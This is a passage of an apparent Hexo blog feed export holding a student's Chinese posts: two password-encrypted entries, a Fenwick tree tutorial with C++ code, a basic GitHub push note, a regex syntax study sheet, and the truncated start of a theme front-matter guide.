      <title>一星期水铜</title>
      <link href="/2022/03/30/yi-xing-qi-shui-tong/"/>
      <url>/2022/03/30/yi-xing-qi-shui-tong/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="d07a36dcf047153f01a8f406a2372648cdd644c674fcc735252a8d022111f96e">2cf9f0e39f26ddd937cd5eb31197d2f7452e35fa3efd28f8064b690826064841860dc90b0ea8c0ba6cbd42298ac781e59e7051af512eb8ae324cf1d4c26087742a2a20035ce7f29a2f492152b74db6a7746399a1d926406362762ff6725ce76f88e836f0f318d24c045eca9b71cd243a7998ab3bf4135c5f1e4265f04cda2df0ef2ce4b0ffef482ec55098aac38cd152757c300938bbb076a74682c5b26b1049ab249be8a7a0b330823ab99ca39726b0da0eb18048609a95374d79d470936b8afddc3a9041b389eefb36e6a9ae5340cb04fa9bb5c16a649b64c41f7de25cd283e8cb0f83cfdf00d6f6bcdded2813a932e2a01394ce7adfb19ca9a0f2b60329485024c8a37cc089416ba578b6093d46d94925d27171855e7ec652c1e80d9c543f8051b17a908efd3c190a157ff99f35adb5bdbfa591b23cbeefddf7da18bef7c75ce17dbab19e9ffc2f76d54a81c745424fab33b9d9542a1e68c7cc89b3f37be326548b688ced1daad6f56cf167602e253688e730aa0ad86dc52f5f380364f78011cb6c5fea011be24ee9458c1621f87f4fe9abe8d897a434042e4fa78a761d4734bd277e303d7333f0ffabc2d39dc72ce3e23a96d1a2a3f4f7a6aa03c3cacaad83d2e6f22ddfa83262eff8a9a7ceb827c8577f51a021a3884363436f85f1fb5265f8a63a6a4f049a53abddb9fa3b2340d3156d2129188898f661861d630a6a8802ce2916d74770c2cce62f34ecbca803c81d8ba3ed23e0df83d73cbd777a37684289f09690f23a8fc148a310f0af4421e6c65bdf31c85b5b73409b55dea9464b2b01c89cd91ceae60f0f6bd1d2831a5e4157c3a88df17ddd5fe2dff74d3d8f1b329e79eb0a035016e8e5b3aeef317d983ee7dc2cfa1a35cc15615c4118be3c363f7d67a29d2a7b2d32dfccbac2d89be87d78fa7758d3ea47071c2d7c39636efa69d5296eabcb979a32a550df18f67e439eb433a1d3a107628bde2f60958075a218f85155881a5351f10c08d79565481bc1e3758c879d25d1025d74c3a4ce00c8cbc018eb58887b04c5bdca7e1753de9cc979709760b3356215c4b52db206d9e6e842313758d856884b8574101149ce3e283894e61efa75e7f72368e1d04538dfb1749cbc6ef51907efd0c1bf210d1b03b0d0134dc03b04bb0abc7d1b290b2b9e9208835c46eaa5edd0d2a8521634327e43dd7263e1b84ab7059b5324ea0f3ef49087e0dbb13e9cd347b2e74a9601023e94d125c6b5468c8ebc955b5bef056e6ee81ada918d28aa9f3c6c9f005412b7420bf3e30ccdc765e5d40476b0ac29f8639407673c348ee4b9590b19fb146af41dad3dc713f1c187431a826eb1589518b151a0d9117cb95a9761afe1b9b4f24d885a00682f68fb83a6f47b0d3b88f7c6188bd7f67545e10b80f42ea5c01d4089c9a5280ed2a871c8e05ac2e83ff16663134b9ca91d67a3aa61f60a1e4d7bcd127f4d667cbb9a6a37dfbff87972997ad492cd6aadc8cc86db8e2bbd3373b81d550c642a2e614f6a6a623adc2d0240ec479fd4a42e78abad4b2d91d53b1d58f7982693e26e8445279041ba5f47626f20a185b28004531adb82efc5c6ef1eb788ac9d53b1761b3cdb6b6df2158fe32a359e3823c66ab26abf9dfdc2ba794ac1fcc859cf7d6e0a610470fced0d8bcef27a7250835e319c3aedfc3b536e28ada425f73832f8a576301a4211fb7f28ddcb265002343781492a941976b388f1df0c3d3f2e5a553a3aeaea44373b87efaf7f87744780a262e5bd94add8ae1d19626f305858507f2c24b18578d9565a6b3f7fff1e5dc288cfb4c67b204ec5b59e4d6d8fc3ae313d183c656cdaf797f9b4ca8a402bf218b770f3cd17d4e9f5700634bb21af453d566f7fb1cd46604256df00738b01dfed35b718512c5ba51bf95bce2bb398d65981e487ae459a4dcfa0e50d1870898929ef9d446a025cdf5bc66ad19e42ca08a9d4537a42a49aa51e32724a7e280a5a5003047433aa574a0e2f53058541eff327dd8476515205b33cd2ea42123649bda54406cd83436a6036f90ef9076448666c7032795cd362adfd36c440b317eb84b4c00e1a76098379f8936e1693bbcfd50331b593863d634d8232298fafbac440e08a0bffcb1eb3f780815b6d1931183ccac9e83714bd30ef5633817f306bb8f295be133608935e0d4a20822a35e7e7f6aa4d608ac32f3f888ced8659be4b599e11ce52604830599ef5d81cc353424164feb89db03bb936c0c3f51a90a4f734bdbfa4dc51b900f6650e894251f1aa8963598ce1bbf916161f1a0e2e0262cc71834c6eeb4bfabb37a464f64ced352f7ecf639c6ec3b1331782073c4d2b5994041c0eacdd60dd44408c6df1b15d8492876cac212a34b7f78d05f754b922bc860f3906e12895000ea610d88c67d6d77ef97bfe2cb6d11a5332bb551307fe9bfb736e24929885dffc945672ed8bb04df4615d49fdcbba58c330c976ff67f6fbfb227cff649eb52c648443fccb5e859955aa0c3b5ea0605208f33f77931040708bab7c309404967ba800215bce81488990502456b1637f5c60d698e9273d9c0a379416d6d2155af9e95f8122cdf851fdd6cd274e14b57181127e6b7a3e91c18c89d03f81ed07231a12da66a0eac835ab3fefe5ed95bbabb64a00da69b62407654b5a9335c7a50ab722ee14513a18329587813e23511428ef4b60c487e0c64c4d87cc34cf47d65ca2403f9d0809e7b61fcd727b61004d68f115382f3b723d5381c002614a3fc6e8f10861621e36575b4dbb27a0ebbc6afefeaa05d97d4bf9bb9baf7c1b6dff57f9f1e37c7abed64f4354798bb32f6bbf2f912de44a439375d8b4dbe142015562080bd096cf7d1c2f7e5457a82fb5b731f674c3fc6defec3ae6e97a46cc6d6f1e61c149544e9af4eaac047422a6b4bdf912e02695750bb8558afa43a13c1fd43bbc2e6cbeb068b4f8f4f7c280f417eb1ba4f9c59c73a8b282df0f98b97cca1bf3507ff92c863850faf48361075f0db0cbf984f16432b4aa073bc3c8006c023eeda38c7b768f7750e94b107e70f8ae8aa59fcac230a38209649499bac22d1cbf2ef4fd02482de1a3e1913a102dc0c92a77c51be8efc9ca194ad0637522e85e75b3fdd9fad42606b4539c399edd10726d58e1337a45f648d70bc4ffafb3004e1ddc9488b8143e100de75f8cb39f964a0ef03386685a99b5c4cc258ca45555540eb2110e348418af9ccf82ada91dbb6ff96752cf7b1e822555b3f46555b96263e8efd391d305fb1bb41768769ee8f9b13d8d9a3c20e52c126db56333d569261ae2821c49bc3b9deb9aa41f92100cdf329de5d99c7d096594cf1d787fbe696b74d6b1c747031b3e1f294d9c2f2e0500</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法与程序设计 </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于勤工俭学那些事</title>
      <link href="/2022/03/24/guan-yu-qin-gong-jian-xue-na-xie-shi/"/>
      <url>/2022/03/24/guan-yu-qin-gong-jian-xue-na-xie-shi/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e10dd18f7ef24532e9b10ce9d5acf2023881695e7d5517386b1aef5017b62632"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勤工俭学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树状数组学习</title>
      <link href="/2022/03/23/shu-zhuang-shu-zu-xue-xi/"/>
      <url>/2022/03/23/shu-zhuang-shu-zu-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><del>做了一道大水题</del>，挺有趣的，做不出来百度到可以使用<code>树状数组</code>或者<code>线段树</code>来解答，于是选择了实现起来比较简单的树状数组来解题。一开始思考了很久，想不通为啥可以使用树状数组就能解出来，逛了会b站回来就想通了（<del>逆大天</del>），在此感谢<code>xenny</code>大佬的<a href="https://www.cnblogs.com/xenny/p/9739600.html">树状数组详解</a>，帮助我学习到了一个<code>全新的知识点</code>😇。</p><h3 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h3><p>先来谈谈树状数组：就是拿数组来模拟树形的结构，可以解决大部分区间更新以及求和的问题。  </p><p>先看看具体的例子：  </p><p><img src="/images/tree-array.png" class="lazyload placeholder" data-srcset="/images/tree-array.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>红色的为<code>C[i]</code>，黑色的为<code>A[i]</code>，关系式可以推出如下：  </p><ul><li>C[1] &#x3D; A[1];</li><li>C[2] &#x3D; A[1] + A[2];</li><li>C[3] &#x3D; A[3];</li><li>C[4] &#x3D; A[1] + A[2] + A[3] + A[4];</li><li>C[5] &#x3D; A[5];</li><li>C[6] &#x3D; A[5] + A[6];</li><li>C[7] &#x3D; A[7];</li><li>C[8] &#x3D; A[1] + A[2] + A[3] + A[4] + A[5] + A[6] + A[7] + A[8];</li></ul><p>然后就<del>自然而然</del>可以推出来一些规律性的东西：  </p><p><strong>C[i] &#x3D; A[i - 2^k+1] + A[i - 2^k+2] +…+ A[i];</strong> (其中k为就是从最低位开始，<code>第一个为1的2的指数</code>)  </p><p>又容易得出<strong>SUM（i） &#x3D; C[i] + C[i-2^k（1）] + C[(i - 2^k（1）) - 2^k（2）] + …..；</strong>(k从2^0开始往上递增，直到c[i]不存在时)</p><p>然后就到了第一个难点，我第一个看不懂的地方：<code> i&amp;(-i);</code>  </p><p>翻阅树状数组的文章时才明白是<code>前人的</code>的智慧。。。<code>2^k = i&amp;(-i);</code></p><p><del>开始偷懒复制粘贴了</del>  </p><p><code>这里利用的负数的存储特性，负数是以补码存储的，对于整数运算 x&amp;(-x)有     ● 当x为0时，即 0 &amp; 0，结果为0；     ●当x为奇数时，最后一个比特位为1，取反加1没有进位，故x和-x除最后一位外前面的位正好相反，按位与结果为0。结果为1。     ●当x为偶数，且为2的m次方时，x的二进制表示中只有一位是1（从右往左的第m+1位），其右边有m位0，故x取反加1后，从右到左第有m个0，第m+1位及其左边全是1。这样，x&amp; (-x) 得到的就是x。      ●当x为偶数，却不为2的m次方的形式时，可以写作x= y * (2^k)。其中，y的最低位为1。实际上就是把x用一个奇数左移k位来表示。这时，x的二进制表示最右边有k个0，从右往左第k+1位为1。当对x取反时，最右边的k位0变成1，第k+1位变为0；再加1，最右边的k位就又变成了0，第k+1位因为进位的关系变成了1。左边的位因为没有进位，正好和x原来对应的位上的值相反。二者按位与，得到：第k+1位上为1，左边右边都为0。结果为2^k。     总结一下：x&amp;(-x)，当x为0时结果为0；x为奇数时，结果为1；x为偶数时，结果为x中2的最大次方的因子。</code></p><p>而且这个有一个专门的称呼，叫做<code>lowbit</code>，即取<code>2^k</code>。  </p><p>下面就贴贴代码模板了：  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int n,m;int a[50005],c[50005]; &#x2F;&#x2F;对应原数组和树状数组int lowbit(int x)&#123;    return x&amp;(-x);&#125;void updata(int i,int k)&#123;    &#x2F;&#x2F;在i位置加上k    while(i &lt;&#x3D; n)&#123;        c[i] +&#x3D; k;        i +&#x3D; lowbit(i);    &#125;&#125;int getsum(int i)&#123;        &#x2F;&#x2F;求A[1 - i]的和    int res &#x3D; 0;    while(i &gt; 0)&#123;        res +&#x3D; c[i];        i -&#x3D; lowbit(i);    &#125;    return res;&#125;int main()&#123;    int t;    cin&gt;&gt;t;    for(int tot &#x3D; 1; tot &lt;&#x3D; t; tot++)&#123;        cout &lt;&lt; &quot;Case &quot; &lt;&lt; tot &lt;&lt; &quot;:&quot; &lt;&lt; endl;        memset(a, 0, sizeof a);        memset(c, 0, sizeof c);        cin&gt;&gt;n;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++)&#123;            cin&gt;&gt;a[i];            updata(i,a[i]);   &#x2F;&#x2F;输入初值的时候，也相当于更新了值        &#125;        string s;        int x,y;        while(cin&gt;&gt;s &amp;&amp; s[0] !&#x3D; &#39;E&#39;)&#123;            cin&gt;&gt;x&gt;&gt;y;            if(s[0] &#x3D;&#x3D; &#39;Q&#39;)&#123;    &#x2F;&#x2F;求和操作                int sum &#x3D; getsum(y) - getsum(x-1);    &#x2F;&#x2F;x-y区间和也就等于1-y区间和减去1-(x-1)区间和                cout &lt;&lt; sum &lt;&lt; endl;            &#125;            else if(s[0] &#x3D;&#x3D; &#39;A&#39;)&#123;                updata(x,y);            &#125;            else if(s[0] &#x3D;&#x3D; &#39;S&#39;)&#123;                updata(x,-y);    &#x2F;&#x2F;减去操作，即为加上相反数            &#125;        &#125;    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于树状数组的变形，有时间再写吧（<del>可能不会再写了，毕竟就是学这一段时间</del></p><p>————————————————</p><h3 id="原题目"><a href="#原题目" class="headerlink" title="原题目"></a>原题目</h3><p>题目竟然叫作<code>这是一道大水题</code>，焯😡</p><p><img src="/images/tree-sum.png" class="lazyload placeholder" data-srcset="/images/tree-sum.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>对应AC的代码：  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt; using namespace std;typedef long long ll;ll a[300005],c[300005]&#x3D;&#123;0&#125;;ll n,m;ll result&#x3D;0;inline ll read()&#123;int x&#x3D;0,f&#x3D;1;char ch&#x3D;getchar();    while(ch&lt;&#39;0&#39;||ch&gt;&#39;9&#39;)&#123;if(ch&#x3D;&#x3D;&#39;-&#39;)f&#x3D;-1;ch&#x3D;getchar();&#125;    while(ch&gt;&#x3D;&#39;0&#39;&amp;&amp;ch&lt;&#x3D;&#39;9&#39;)&#123;x&#x3D;x*10+ch-&#39;0&#39;;ch&#x3D;getchar();&#125;    return x*f;&#125;ll lowbit(ll x)&#123;return x&amp;(-x);&#125;void update(ll i,ll value)&#123;while(i&lt;&#x3D;n)&#123;c[i]+&#x3D;value;i+&#x3D;lowbit(i);&#125;&#125;ll getsum(ll i )&#123;ll sum&#x3D;0;while(i&gt;0)&#123;sum+&#x3D;c[i];i-&#x3D;lowbit(i);&#125;return sum;&#125;int main()&#123;n&#x3D;read();m&#x3D;read();while(m--)&#123;ll c;c&#x3D;read();if(c&#x3D;&#x3D;0)&#123;ll left,right,value;left&#x3D;read();right&#x3D;read();value&#x3D;read();ll temp&#x3D;(right-left+1)*value;result+&#x3D;temp;update(left,temp);update(right+1,-temp);&#125;else &#123;ll pos;pos&#x3D;read();cout&lt;&lt;result-getsum(pos)&lt;&lt;endl;&#125; &#125;  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 树状数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于github本地项目提交</title>
      <link href="/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/"/>
      <url>/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><code>github</code>项目提交的步骤总是会忘记，所以开一篇文章来记录一下，仅记录最简单的第一种方式。  </p><p>查阅的文章：<a href="https://www.cnblogs.com/du-hong/p/9921214.html">Git的使用–如何将本地项目上传到Github（三种简单、方便的方法）</a>  </p><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><p>首先本地下载安装git工具  </p><p>登录<code>github</code>，<code>new repository</code> 新建一个新的项目  </p><p>记得新建完项目之后，copy一下<code>https</code>的项目地址  </p><p>然后来到本地操作，来到项目文件夹，右键git bash here 打开命令行  </p><p><code>git clone 项目名称</code> 把仓库克隆到本地上面  </p><p>再把自己项目的所有文件copy到刚刚建立的仓库文件夹  </p><p><code>cd</code>到仓库文件夹  </p><p>接下来依次输入一下代码即可完成剩余操作：  </p><p><code>git add *</code>  </p><p><code>git commit -m &quot;备注的提交信息&quot;</code>  </p><p><code>git push -u origin main（这个是你分支的名称）</code></p><p>————————————————————</p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RegExp学习</title>
      <link href="/2022/03/20/regexp-xue-xi/"/>
      <url>/2022/03/20/regexp-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>其实很早就接触<code>正则表达式</code>了，知识一直没有系统学习，总是记了一部分就会忘记，所以这一次记录一下学习的过程。  学习的网站是：<a href="https://www.runoob.com/regexp/regexp-syntax.html">菜鸟教程的正则表达式教学</a>(所以可能都是复制粘贴，经典CV大法hhhhh</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><strong>runoo+b</strong>，可以匹配 <strong>runoob、runooob、runoooooob</strong> 等，**+** 号代表前面的字符必须至少出现一次（1次或多次）。</li><li><strong>runoo*b</strong>，可以匹配 <strong>runob、runoob、runoooooob</strong> 等，***** 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</li><li><strong>colou?r</strong> 可以匹配 <strong>color</strong> 或者 <strong>colour</strong>，**?** 问号代表前面的字符最多只可以出现一次（0次或1次）。</li></ul><p><code>/[^aeiou]/</code>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong>[^aeiou]</strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。  </p><p><code>/[A-Z]/g</code> 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。    </p><p><code>/./g</code>  匹配除换行符<code>（\n、\r）</code>之外的任何单个字符，相等于<code> [^\n\r]</code>。  </p><p><code>/[\s\S]/g</code>  匹配所有。<code>\s </code>是匹配所有空白符，包括换行，<code>\S </code>非空白符，不包括换行。  </p><p><code>/[\w]/</code>  匹配字母、数字、下划线。等价于<code> [A-Za-z0-9_]</code>  </p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><table><thead><tr><th align="left">特别字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">$</td><td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td></tr><tr><td align="left">( )</td><td align="left">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用<code> \*</code>。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 <code>\+</code>。</td></tr><tr><td align="left">.</td><td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用<code>\.</code>。</td></tr><tr><td align="left">[</td><td align="left">标记一个中括号表达式的开始。要匹配 [，请使用<code> \[</code>。</td></tr><tr><td align="left">?</td><td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用<code> \?</code>。</td></tr><tr><td align="left">\</td><td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td></tr><tr><td align="left">^</td><td align="left"><strong>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合</strong>。要匹配 ^ 字符本身，请使用 <code>\^</code>。</td></tr><tr><td align="left">{</td><td align="left">标记限定符表达式的开始。要匹配 {，请使用<code> \&#123;</code>。</td></tr><tr><td align="left">|</td><td align="left">指明两项之间的一个选择。要匹配 |，请使用 <code>|</code>。</td></tr></tbody></table><h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td align="left">?</td><td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n,}</td><td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td align="left">{n,m}</td><td align="left">m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr></tbody></table><h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词边界，即字与空格间的位置。</td></tr><tr><td align="left">\B</td><td align="left">非单词边界匹配。</td></tr></tbody></table><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔。  </p><p><strong>()</strong> 表示捕获分组，**()** 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)。  </p><p>但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用 <strong>?:</strong> 放在第一个选项前来消除这种副作用。</p><p>其中 <strong>?:</strong> 是非捕获元之一，还有两个非捕获元是 <strong>?&#x3D;</strong> 和 **?!**，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p> <code>exp1(?=exp2)</code>：查找 exp2 前面的 exp1。  </p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><table><thead><tr><th align="left">修饰符</th><th align="left">含义</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">i</td><td align="left">ignore - 不区分大小写</td><td align="left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="left">g</td><td align="left">global - 全局匹配</td><td align="left">查找所有的匹配项。</td></tr><tr><td align="left">m</td><td align="left">multi line - 多行匹配</td><td align="left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td></tr><tr><td align="left">s</td><td align="left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td align="left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><table><thead><tr><th align="left">\d</th><th>匹配一个数字字符。等价于 [0-9]。</th></tr></thead><tbody><tr><td align="left">\D</td><td>匹配一个非数字字符。等价于 <code>[^0-9]</code>。</td></tr><tr><td align="left">\f</td><td>匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td align="left">\n</td><td>匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td align="left">\r</td><td>匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td align="left">\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。</td></tr><tr><td align="left">\S</td><td>匹配任何非空白字符。等价于<code>[^ \f\n\r\t\v]</code>。</td></tr><tr><td align="left">\t</td><td>匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td align="left">\v</td><td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td align="left">\w</td><td>匹配字母、数字、下划线。等价于<code>&#39;[A-Za-z0-9_]&#39;</code>。</td></tr><tr><td align="left">\W</td><td>匹配非字母、数字、下划线。等价于<code> &#39;[^A-Za-z0-9_]&#39;</code>。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> regexp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-bamboo文章Front-matter介绍</title>
      <link href="/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/"/>
      <url>/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="文章Front-matter介绍"><a href="#文章Front-matter介绍" class="headerlink" title="文章Front-matter介绍"></a>文章Front-matter介绍</h1><p>这个front-matter指的就是你文章写在最前面的那些参数，只针对这篇文章，下面的是hexo主题bamboo的参数，如下：  </p><pre class="line-numbers language-none"><code class="language-none">---title: Hexo主题--Bamboo介绍date: 2020-09-14 14:06swiper: true # 将该文章放入轮播图中swiperImg: &#39;&#x2F;medias&#x2F;1.jpg&#39; # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http:&#x2F;&#x2F;xxx图片swiperDesc: &#39;文章的front-matter编辑&#39;img: &#39;&#x2F;medias&#x2F;1.jpg&#39; # 该文章图片，可以是本地目录下图片也可以是http:&#x2F;&#x2F;xxx图片categories: 前端tags: [Hexo, hexo-theme-bamboo]top: true---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Front-matter</code> 